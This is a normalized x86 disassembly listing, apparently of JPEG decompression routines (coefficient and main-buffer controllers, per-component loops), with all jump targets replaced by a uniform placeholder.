xor ebx ebx
mov [ ecx + 0x8 ] ebx
xor ebx ebx
mov [ ecx + 0xc ] ebx
xor ebx ebx
mov [ ecx + 0x10 ] ebx
mov [ ecx + 0x14 ] edx
sub edx 0x1
jae r-xdata
mov edx [ eax ]
mov [ edx + 0x14 ] 0x4
mov ecx [ eax ]
call [ ecx ]
mov [ ecx + 0x4 ] sub_499cc0
pop ebx
retn
sub_499cc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ esi + 0x14c ]
jmp r-xdata
mov edx [ ebx + 0x8 ]
cmp edx [ esi + 0xec ]
jb r-xdata
cmp [ ebx + 0xc ] 0x8
jae r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebx + 0xc ] 0x8
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x18 ]
push eax
mov eax esi
push edx
lea ecx [ ebx + 0xc ]
push ecx
push 0x8
mov edi [ eax + 0x150 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ edi + 0x4 ]
lea edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax + 0x154 ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
inc [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
inc [ edx ]
xor ecx ecx
mov [ ebx + 0x10 ] ecx
mov eax [ ebp - 0x8 ]
dec [ eax ]
mov [ ebx + 0x10 ] 0x1
jmp r-xdata
sub_499d58
push ebx
mov ebx eax
push esi
push edi
mov eax ebx
push ebp
push ecx
mov esi edx
mov edi [ eax + 0x4 ]
mov edx 0x1
mov ecx 0x40
call [ edi ]
mov [ ebx + 0x14c ] eax
mov [ eax ] sub_499c80
cmp [ ebx + 0xac ] 0x0
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
xor ecx ecx
lea edi [ eax + 0x18 ]
mov [ esp ] ecx
mov esi [ ebx + 0x40 ]
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax [ esp ]
cmp eax [ ebx + 0x38 ]
jl r-xdata
mov eax [ esi + 0xc ]
mov edx 0x1
shl eax 0x3
push eax
mov eax ebx
mov ecx [ esi + 0x1c ]
shl ecx 0x3
mov ebp [ eax + 0x4 ]
call [ ebp + 0x8 ]
mov [ edi ] eax
add edi 0x4
inc [ esp ]
add esi 0x54
sub_499ddc
push ebx
push esi
mov esi eax
test edx edx
mov ebx [ esi + 0x150 ]
je r-xdata
mov ecx [ esi + 0x20 ]
xor eax eax
mov [ ebx + 0x30 ] ecx
xor edx edx
mov [ ebx + 0x34 ] eax
mov [ ebx + 0x38 ] edx
mov ecx [ esi + 0xe8 ]
add ecx ecx
mov [ ebx + 0x3c ] ecx
pop esi
pop ebx
retn
mov eax [ esi ]
mov [ eax + 0x14 ] 0x4
mov eax esi
mov edx [ eax ]
call [ edx ]
sub_499e18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx edi
cmp ebx [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebx
push 0x1
mov eax [ ebp - 0x4 ]
lea edx [ edi - 0x1 ]
push eax
mov eax esi
mov ecx esi
call sub_497770
inc ebx
cmp ebx [ ebp + 0x8 ]
jl r-xdata
sub_499e50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi [ ebx + 0x150 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ebp + 0xc ]
mov ecx [ edx ]
cmp ecx [ ebp + 0x8 ]
jb r-xdata
mov ecx [ ebx + 0xe8 ]
mov edx [ ebp + 0x14 ]
sub ecx [ esi + 0x34 ]
sub edx eax
mov eax edx
mov [ ebp - 0xc ] ecx
cmp eax [ ebp - 0xc ]
jbe r-xdata
mov edx eax
mov edx [ ebp - 0xc ]
jmp r-xdata
mov edx [ esi + 0x34 ]
cmp edx [ ebx + 0xe8 ]
jne r-xdata
mov eax [ esi + 0x34 ]
cmp eax [ ebx + 0xe8 ]
jge r-xdata
mov [ ebp - 0xc ] edx
mov eax [ esi + 0x34 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
lea ecx [ esi + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov eax ebx
shl edx 0x2
add edx [ ebp - 0x4 ]
mov edi [ eax + 0x15c ]
call [ edi + 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
add [ edx ] eax
mov ecx [ ebp - 0xc ]
add [ esi + 0x34 ] ecx
sub [ esi + 0x30 ] eax
cmp [ esi + 0x30 ] 0x0
jne r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
xor ecx ecx
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov eax ebx
push edx
lea edx [ esi + 0x8 ]
mov edi [ eax + 0x160 ]
call [ edi + 0x4 ]
xor eax eax
mov [ esi + 0x34 ] eax
mov edx [ ebp + 0xc ]
inc [ edx ]
xor edi edi
lea eax [ esi + 0x8 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
cmp edi [ ebx + 0x38 ]
jl r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebx + 0x40 ]
mov edx eax
xor edi edi
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebx + 0xe8 ]
push edx
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
mov ecx [ esi + 0x34 ]
mov edx [ ebx + 0x1c ]
call sub_499e18
inc edi
add [ ebp - 0x10 ] 0x4
mov eax [ ebx + 0xe8 ]
mov [ esi + 0x34 ] eax
cmp edi [ ebx + 0x38 ]
jl r-xdata
mov eax [ esi + 0xc ]
mov edx eax
imul edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
imul ecx eax
mov edx [ esi + 0x1c ]
shl edx 0x3
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_499e18
add [ ebp - 0x14 ] 0x4
inc edi
add esi 0x54
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ edx ] ecx
jmp r-xdata
sub_499fb0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x150 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xe8 ]
lea edx [ edx + edx * 2 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jb r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ecx ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x3c ]
mov edx [ ebp + 0x14 ]
sub ecx [ ebx + 0x34 ]
sub edx eax
mov eax edx
mov [ ebp - 0x10 ] ecx
cmp eax [ ebp - 0x10 ]
jbe r-xdata
mov ecx [ ebx + 0x34 ]
cmp ecx [ ebx + 0x3c ]
jge r-xdata
mov edx eax
mov edx [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebx + 0x3c ]
jne r-xdata
xor eax eax
lea esi [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add [ ecx ] eax
mov edx [ ebp - 0x10 ]
add [ ebx + 0x34 ] edx
sub [ ebx + 0x30 ] eax
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x14 ] ecx
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x10 ] edx
mov eax [ ebx + 0x34 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ ebp - 0x4 ]
shl edx 0x2
add edx [ ebp - 0x8 ]
mov esi [ eax + 0x15c ]
call [ esi + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x20 ]
cmp edx [ ebx + 0x30 ]
jne r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push eax
lea edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x160 ]
call [ esi + 0x4 ]
mov eax [ ebp + 0xc ]
inc [ eax ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xe8 ]
add [ ebx + 0x38 ] ecx
mov eax [ ebx + 0x38 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
cmp edx [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x38 ]
cmp edx [ ebp - 0x14 ]
jg r-xdata
mov ecx [ ebx + 0x34 ]
cmp ecx [ ebp - 0x18 ]
jl r-xdata
xor edx edx
mov [ ebx + 0x38 ] edx
mov eax [ ebx + 0x3c ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov eax [ esi ]
mov ecx [ ebx + 0x34 ]
call sub_499e18
inc [ ebp - 0x14 ]
add esi 0x4
mov ecx [ ebx + 0x3c ]
mov [ ebx + 0x34 ] ecx
mov edi 0x1
mov eax [ ebp - 0x1c ]
mov esi eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xe8 ]
add ecx [ ebx + 0x34 ]
mov [ ebx + 0x3c ] ecx
xor eax eax
mov [ ebx + 0x34 ] eax
mov ecx [ ebp - 0x4 ]
cmp edi [ ecx + 0xe8 ]
jle r-xdata
mov edx edi
neg edx
push edx
push 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1c ]
push edx
xor edx edx
mov eax [ esi ]
mov ecx eax
call sub_497770
inc edi
inc [ ebp - 0x14 ]
add [ ebp - 0x1c ] 0x4
sub_49a158
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] eax
mov eax [ esp ]
mov esi [ eax + 0x150 ]
mov eax [ esp ]
mov ebx [ eax + 0xe8 ]
mov eax [ esp ]
mov edx [ eax + 0x38 ]
mov eax [ esp ]
imul edx ebx
mov edi [ eax + 0x4 ]
lea ecx [ edx + edx * 4 ]
shl ecx 0x2
mov edx 0x1
call [ edi ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x4 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x40 ]
mov [ esp + 0x8 ] ecx
lea eax [ esi + 0x8 ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x38 ]
cmp edx [ esp + 0x4 ]
jg r-xdata
lea edx [ ebx + ebx * 2 ]
push edx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov eax [ ecx + 0x1c ]
mov ecx [ esp + 0xc ]
shl eax 0x3
imul [ edx + 0xe4 ]
cdq
idiv [ ecx + 0x8 ]
mov ecx eax
mov eax [ esp + 0x4 ]
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi + 0x8 ]
mov esi eax
lea eax [ ebx + ebx * 2 ]
shl eax 0x2
mov edx ebx
push eax
push esi
shl edx 0x2
add edx [ esp + 0x14 ]
push edx
call sub_48ab50
add esp 0xc
xor eax eax
cmp ebx eax
mov ecx esi
mov edx [ esp + 0xc ]
jle r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov ecx ebx
shl ecx 0x2
mov edx [ esp + 0x10 ]
shl eax 0x2
add eax [ esp + 0xc ]
lea ecx [ ecx + ecx * 4 ]
mov [ edx ] eax
add [ esp + 0xc ] ecx
add [ esp + 0x10 ] 0x4
inc [ esp + 0x4 ]
add [ esp + 0x8 ] 0x54
lea edi [ eax + ebx * 2 ]
mov edi [ esi + edi * 4 ]
mov [ edx ] edi
lea edi [ eax + ebx * 4 ]
mov ebp [ esp + 0xc ]
inc eax
add edx 0x4
lea edi [ ebp + edi * 4 ]
push edi
pop ebp
mov edi [ ecx ]
add ecx 0x4
cmp ebx eax
mov [ ebp ] edi
jg r-xdata
sub_49a270
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
test edx edx
je r-xdata
mov eax ebx
mov ecx 0x40
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x150 ] eax
mov [ eax ] sub_499ddc
mov edx [ ebx + 0x160 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ eax + 0x4 ] sub_499e50
xor ecx ecx
lea edi [ eax + 0x8 ]
mov [ esp ] ecx
mov esi [ ebx + 0x40 ]
jmp r-xdata
mov [ eax + 0x4 ] sub_499fb0
mov eax ebx
call sub_49a158
jmp r-xdata
mov eax [ esp ]
cmp eax [ ebx + 0x38 ]
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0xe8 ]
push eax
mov eax [ esi + 0x1c ]
shl eax 0x3
imul [ ebx + 0xe4 ]
cdq
idiv [ esi + 0x8 ]
mov ecx eax
mov eax ebx
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x8 ]
mov [ edi ] eax
add edi 0x4
inc [ esp ]
add esi 0x54
sub_49a318
cmp [ eax + 0xf0 ] 0x1
mov edx [ eax + 0x154 ]
jle r-xdata
mov ecx [ eax + 0xec ]
dec ecx
cmp ecx [ edx + 0x8 ]
jbe r-xdata
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov ecx [ eax + 0xf4 ]
mov eax [ ecx + 0x48 ]
mov [ edx + 0x14 ] eax
mov eax [ eax + 0xf4 ]
mov eax [ eax + 0xc ]
mov [ edx + 0x14 ] eax
jmp r-xdata
xor ecx ecx
xor eax eax
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] eax
retn
sub_49a364
push ebx
push esi
mov esi eax
push edi
xor eax eax
mov edi edx
mov ebx [ esi + 0x154 ]
mov [ ebx + 0x8 ] eax
mov eax esi
call sub_49a318
sub edi 0x1
jb r-xdata
cmp [ ebx + 0x40 ] 0x0
je r-xdata
dec edi
je r-xdata
mov [ ebx + 0x4 ] sub_49a3f8
jmp r-xdata
mov edx [ esi ]
mov eax esi
mov [ edx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
dec edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x4 ] sub_49a88c
jmp r-xdata
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebx + 0x4 ] sub_49a608
jmp r-xdata
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
sub_49a3f8
push ebx
push esi
push edi
add esp 0xffffffcc
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov esi [ eax + 0x154 ]
mov eax [ esp ]
mov edx [ eax + 0x104 ]
dec edx
mov [ esp + 0xc ] edx
mov ecx [ esp ]
mov eax [ ecx + 0xec ]
dec eax
mov [ esp + 0x10 ] eax
mov edx [ esi + 0x10 ]
mov [ esp + 0x20 ] edx
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ esp + 0x20 ]
jg r-xdata
mov ecx [ esi + 0xc ]
mov [ esp + 0x8 ] ecx
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
ja r-xdata
inc [ esi + 0x8 ]
mov eax [ esp ]
call sub_49a318
mov eax 0x1
xor ecx ecx
mov [ esi + 0xc ] ecx
inc [ esp + 0x20 ]
xor edx edx
xor ecx ecx
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] ecx
mov eax [ esp ]
lea edx [ eax + 0xf4 ]
mov [ esp + 0x30 ] edx
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0xf0 ]
cmp eax [ esp + 0x18 ]
jg r-xdata
mov ecx [ esp + 0x30 ]
mov ebx [ ecx ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
jae r-xdata
lea edx [ esi + 0x18 ]
mov eax [ esp ]
mov ecx [ eax + 0x168 ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov edx [ ebx + 0x44 ]
mov edx [ ebx + 0x34 ]
jmp r-xdata
inc [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0xc ]
jbe r-xdata
mov edx [ esp + 0x20 ]
mov [ esi + 0x10 ] edx
mov eax [ esp + 0x8 ]
mov [ esi + 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ esp + 0x1c ]
cmp edx [ ebx + 0x38 ]
jl r-xdata
mov [ esp + 0x24 ] edx
mov eax [ esp + 0x8 ]
imul [ ebx + 0x40 ]
mov [ esp + 0x2c ] eax
mov ecx [ esp + 0x20 ]
shl ecx 0x3
mov [ esp + 0x28 ] ecx
xor eax eax
mov [ esp + 0x1c ] eax
jmp r-xdata
add esp 0x34
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
cmp edx [ esp + 0x10 ]
jb r-xdata
inc [ esp + 0x18 ]
add [ esp + 0x30 ] 0x4
mov eax [ esp + 0x14 ]
mov edx [ esi + eax * 4 + 0x18 ]
push edx
mov ecx [ esp + 0x2c ]
push ecx
mov eax [ esp + 0x34 ]
push eax
mov edx [ esp + 0x30 ]
push edx
mov edx ebx
mov ecx [ esp + 0x14 ]
mov eax [ ebx + 0x4 ]
mov ecx [ ecx + eax * 4 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x164 ]
call [ edi + 0x4 ]
mov eax [ ebx + 0x34 ]
cmp eax [ esp + 0x24 ]
jle r-xdata
mov ecx [ esp + 0x20 ]
add ecx [ esp + 0x1c ]
cmp ecx [ ebx + 0x48 ]
jge r-xdata
mov eax [ ebx + 0x34 ]
add [ esp + 0x14 ] eax
add [ esp + 0x28 ] 0x8
inc [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
add edx [ esp + 0x24 ]
mov ecx [ esi + edx * 4 + 0x18 ]
mov edx eax
sub edx [ esp + 0x24 ]
mov eax ecx
shl edx 0x7
call sub_4977cc
mov eax [ esp + 0x24 ]
jmp r-xdata
mov eax [ esp + 0x14 ]
mov eax [ esi + eax * 4 + 0x18 ]
mov edx [ ebx + 0x34 ]
shl edx 0x7
call sub_4977cc
xor eax eax
mov edx [ esp + 0x14 ]
lea edx [ esi + edx * 4 + 0x14 ]
jmp r-xdata
cmp eax [ ebx + 0x34 ]
jl r-xdata
cmp eax [ ebx + 0x34 ]
jl r-xdata
mov edx [ esp + 0x14 ]
add edx eax
inc eax
mov ecx [ esi + edx * 4 + 0x14 ]
mov edx [ esi + edx * 4 + 0x18 ]
mov cx [ ecx ]
mov [ edx ] cx
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov edi [ edx ]
add ecx eax
inc eax
mov di [ edi ]
mov ecx [ esi + ecx * 4 + 0x18 ]
mov [ ecx ] di
sub_49a608
push ebx
push esi
push edi
add esp 0xffffffb8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x154 ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0xec ]
dec eax
xor edx edx
mov [ esp + 0xc ] eax
mov [ esp + 0x1c ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x40 ]
mov [ esp + 0x28 ] eax
mov edx [ esp + 0x4 ]
mov ecx edx
mov [ esp + 0x40 ] ecx
mov eax [ esp + 0x8 ]
lea edx [ eax + 0x40 ]
mov [ esp + 0x34 ] edx
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x38 ]
cmp eax [ esp + 0x1c ]
jg r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + 0xc ]
push eax
push 0x1
mov edx [ esp + 0x10 ]
mov ecx [ edx + 0x8 ]
imul ecx eax
mov eax [ esp + 0x3c ]
mov edx [ eax ]
mov eax [ esp + 0x8 ]
mov ebx [ eax + 0x4 ]
call [ ebx + 0x20 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x8 ]
cmp edx [ esp + 0xc ]
jae r-xdata
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_49a88c
add esp 0x48
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x28 ]
mov eax [ edx + 0x20 ]
mov edx [ esp + 0x28 ]
mov ecx [ edx + 0xc ]
xor edx edx
div ecx
mov [ esp + 0x24 ] edx
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ ecx + 0xc ]
mov [ esp + 0x24 ] eax
jmp r-xdata
mov eax [ esp + 0x28 ]
xor edx edx
mov ecx [ eax + 0x1c ]
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov eax [ esp + 0x10 ]
div ebx
mov esi edx
test esi esi
jle r-xdata
mov [ esp + 0x24 ] ecx
xor edx edx
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x40 ]
mov eax ecx
mov [ esp + 0x3c ] eax
mov edx [ esp + 0x2c ]
mov ecx edx
mov [ esp + 0x38 ] ecx
mov eax [ esp + 0x20 ]
cmp eax [ esp + 0x24 ]
jge r-xdata
mov eax ebx
sub eax esi
mov esi eax
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x8 ]
cmp eax [ esp + 0xc ]
jne r-xdata
mov edx [ esp + 0x38 ]
mov ecx [ edx ]
mov [ esp + 0x30 ] ecx
mov eax [ esp + 0x30 ]
push eax
mov edx [ esp + 0x24 ]
shl edx 0x3
push edx
push 0x0
mov ecx [ esp + 0x1c ]
push ecx
mov eax [ esp + 0x4c ]
mov edx [ esp + 0x38 ]
mov ecx [ eax ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x164 ]
call [ edi + 0x4 ]
test esi esi
jle r-xdata
add [ esp + 0x34 ] 0x4
add [ esp + 0x40 ] 0x4
inc [ esp + 0x1c ]
add [ esp + 0x28 ] 0x54
add [ esp + 0x10 ] esi
mov eax [ esp + 0x10 ]
xor edx edx
div ebx
mov [ esp + 0x14 ] eax
mov ecx [ esp + 0x24 ]
mov [ esp + 0x20 ] ecx
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
lea ecx [ eax + edx * 4 ]
mov [ esp + 0x44 ] ecx
jmp r-xdata
inc [ esp + 0x20 ]
add [ esp + 0x38 ] 0x4
mov eax [ esp + 0x20 ]
cmp eax [ esp + 0x24 ]
jl r-xdata
mov eax [ esp + 0x10 ]
shl eax 0x7
add [ esp + 0x30 ] eax
mov edx esi
shl edx 0x7
mov eax [ esp + 0x30 ]
call sub_4977cc
mov edx [ esp + 0x30 ]
xor eax eax
cmp esi eax
mov cx [ edx - 0x80 ]
mov edx [ esp + 0x30 ]
jle r-xdata
mov eax [ esp + 0x28 ]
mov edx [ eax + 0xc ]
cmp edx [ esp + 0x20 ]
jg r-xdata
mov [ edx ] cx
inc eax
add edx 0x80
cmp esi eax
jg r-xdata
mov eax [ esp + 0x44 ]
mov edx [ eax ]
mov [ esp + 0x30 ] edx
mov ecx [ esp + 0x44 ]
mov edx [ esp + 0x10 ]
shl edx 0x7
mov eax [ esp + 0x30 ]
mov esi [ ecx - 0x4 ]
call sub_4977cc
xor ecx ecx
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x18 ]
cmp eax [ esp + 0x14 ]
jae r-xdata
inc [ esp + 0x20 ]
add [ esp + 0x44 ] 0x4
mov edx ebx
xor eax eax
shl edx 0x7
cmp ebx eax
mov cx [ esi + edx - 0x80 ]
mov edx [ esp + 0x30 ]
jle r-xdata
mov eax ebx
shl eax 0x7
add [ esp + 0x30 ] eax
add esi eax
inc [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
cmp ecx [ esp + 0x14 ]
jb r-xdata
mov [ edx ] cx
inc eax
add edx 0x80
cmp ebx eax
jg r-xdata
sub_49a88c
push ebx
push esi
push edi
add esp 0xffffffc8
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
lea esi [ esp + 0x28 ]
mov edx [ eax + 0x154 ]
mov [ esp + 0x4 ] edx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea ebx [ eax + 0xf4 ]
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0xf0 ]
cmp edx [ esp + 0xc ]
jg r-xdata
mov eax [ ebx ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x18 ]
mov edi [ edx + 0xc ]
push edi
push 0x0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x20 ]
mov ecx [ eax + 0x8 ]
mov eax [ edx + 0x4 ]
imul ecx edi
mov edx [ esp + 0xc ]
mov edx [ edx + eax * 4 + 0x40 ]
mov eax [ esp + 0x8 ]
mov edi [ eax + 0x4 ]
call [ edi + 0x20 ]
mov [ esi ] eax
add esi 0x4
inc [ esp + 0xc ]
add ebx 0x4
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x10 ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x14 ]
cmp eax [ esp + 0x10 ]
jg r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0xc ]
mov [ esp + 0x8 ] ecx
jmp r-xdata
mov edx [ esp + 0x4 ]
inc [ edx + 0x8 ]
mov eax [ esp ]
call sub_49a318
mov eax 0x1
mov edx [ esp ]
mov ecx [ edx + 0x104 ]
cmp ecx [ esp + 0x8 ]
ja r-xdata
xor ebx ebx
xor eax eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x28 ]
mov [ esp + 0x24 ] edx
mov ecx [ esp ]
lea eax [ ecx + 0xf4 ]
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax + 0xc ] edx
inc [ esp + 0x10 ]
mov edx [ esp ]
mov ecx [ edx + 0xf0 ]
cmp ecx [ esp + 0xc ]
jg r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ edx ]
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x18 ]
mov edx [ eax + 0x34 ]
imul edx [ esp + 0x8 ]
mov [ esp + 0x14 ] edx
xor esi esi
mov eax [ esp + 0x24 ]
mov edx eax
mov [ esp + 0x20 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add edx 0x18
mov ecx [ eax + 0x168 ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
cmp esi [ eax + 0x38 ]
jl r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x10 ]
mov [ eax + 0x10 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0xc ] eax
xor eax eax
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
add ecx esi
mov edx [ eax ]
mov eax [ esp + 0x14 ]
shl eax 0x7
mov edx [ edx + ecx * 4 ]
add edx eax
mov eax [ esp + 0x4 ]
xor ecx ecx
lea eax [ eax + ebx * 4 + 0x18 ]
jmp r-xdata
inc [ esp + 0xc ]
add [ esp + 0x24 ] 0x4
add [ esp + 0x1c ] 0x4
add esp 0x38
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x18 ]
cmp ecx [ edi + 0x34 ]
jl r-xdata
mov [ eax ] edx
add edx 0x80
inc ebx
add eax 0x4
inc ecx
inc esi
sub_49aa54
push ebx
push esi
mov esi eax
push edi
mov eax esi
push ebp
mov ebx edx
mov edx 0x1
mov edi [ eax + 0x4 ]
add esp 0xfffffff8
mov ecx 0x68
call [ edi ]
mov [ esp ] eax
test ebx ebx
mov eax [ esp ]
mov [ esi + 0x154 ] eax
mov edx [ esp ]
mov [ edx ] sub_49a364
je r-xdata
mov eax esi
mov ecx 0x500
mov edx 0x1
mov ebx [ eax + 0x4 ]
call [ ebx + 0x4 ]
mov ecx eax
xor eax eax
mov edx [ esp ]
add edx 0x18
xor ecx ecx
